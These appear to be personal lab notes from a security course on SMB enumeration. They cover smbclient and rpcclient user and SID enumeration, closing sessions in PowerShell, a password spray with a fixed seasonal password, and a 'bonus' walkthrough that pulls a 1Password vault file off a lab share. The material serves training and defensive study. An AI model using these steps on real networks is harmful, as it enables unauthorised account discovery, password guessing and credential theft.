# SMB Investigation Notes

smbclient

```
smbclient -L 10.10.0.1 -U sec504
```

rpcclient test

```
rpcclient 10.10.0.1 -U sec504
 > enumdomusers
 > help
 > srvinfo
 > enumalsgroups domain
 > enumalsgroups builtin
SID ENUMERATION
 > lookupnames sec504
 > lookupnames administrator
 > lookupnames administrators
ENUMERATE USERS WITH RID, 500 is administrator 1000 may be a user
 > queryuser 500
 > queryuser 1000
```

disconnect smb sessions in powershell

```
Get-SmbSession
Get-SmbSession | Close-SmbSession -Force
Get-SmbSession
```

finding weak passwords, Password Spray Attack using PowerShell

```
Import-Module .\LocalPasswordSpray.ps1
Invoke-LocalPasswordSpray -Password Winter2023
```

bonus

```
nmap -sn 172.30.1-254
nmap -A 172.30.0.22
smbclient -U erigby -L 172.30.0.22 -m SMB3
smbclient -U erigby -L 172.30.0.22 -m SMB2
smbclient -U erigby -L 172.30.0.22 -m NT1
rpcclient 172.30.0.22 -U erigby
 > enumdomusers
 > getdompwinfo
 > getusrdompwinfo 1000
smbclient -U erigby //172.30.0.22/data -m SMB2
 > ls
 > cd 1Password/
 > cd 1Password.1pif/
 > get data.1pif
```
